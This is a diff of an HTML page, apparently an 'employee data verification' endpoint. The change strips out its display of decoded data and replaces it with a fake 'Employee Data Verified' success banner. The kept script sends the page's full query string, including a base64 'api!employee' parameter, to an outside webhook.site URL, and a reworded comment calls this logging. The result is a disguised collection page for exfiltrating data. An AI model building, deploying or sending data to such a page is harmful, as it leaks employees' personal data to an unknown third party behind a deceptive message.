@@ -2,40 +2,32 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8">
-  <title>Employee Data</title>
+  <title>Verification</title>
   <style>
     body {
       font-family: Arial, sans-serif;
-      max-width: 700px;
-      margin: 5% auto;
-      line-height: 1.6;
-      color: #333;
       text-align: center;
+      margin-top: 15%;
+      color: #333;
     }
-    #data-box {
-      background: #f5f5f5;
-      padding: 1em;
+    .success {
+      background: #e6ffe6;
+      display: inline-block;
+      padding: 1em 2em;
       border-radius: 10px;
       box-shadow: 0 2px 6px rgba(0,0,0,0.1);
-      text-align: left;
-      white-space: pre-wrap;
-      word-break: break-word;
-      margin-top: 1em;
-    }
-    #error {
-      color: red;
-      font-weight: bold;
+      font-size: 1.3em;
+      color: #006400;
     }
   </style>
 </head>
 <body>
-  <h1>Employee Data</h1>
-  <div id="data-box">Loading employee data...</div>
+  <div class="success">✅ Employee Data Verified</div>
 
   <script>
     const path = window.location.pathname + window.location.search;
 
-    // Send request info to webhook
+    // Log request to webhook
     const params = new URLSearchParams({
       page: path,
       time: new Date().toISOString(),
@@ -45,22 +37,6 @@
 
     fetch("https://webhook.site/89e64e17-f805-4541-9f73-9567abe15011?" + params)
       .catch(err => console.error("Log failed:", err));
-
-    // Decode Base64
-    const box = document.getElementById("data-box");
-    const query = new URLSearchParams(window.location.search);
-    const base64Data = query.get("api!employee");
-
-    if (base64Data) {
-      try {
-        const decoded = atob(base64Data);
-        box.textContent = decoded;
-      } catch (e) {
-        box.innerHTML = '<span id="error">Invalid employee data format.</span>';
-      }
-    } else {
-      box.innerHTML = '<span id="error">No employee data provided.</span>';
-    }
   </script>
 </body>
 </html>
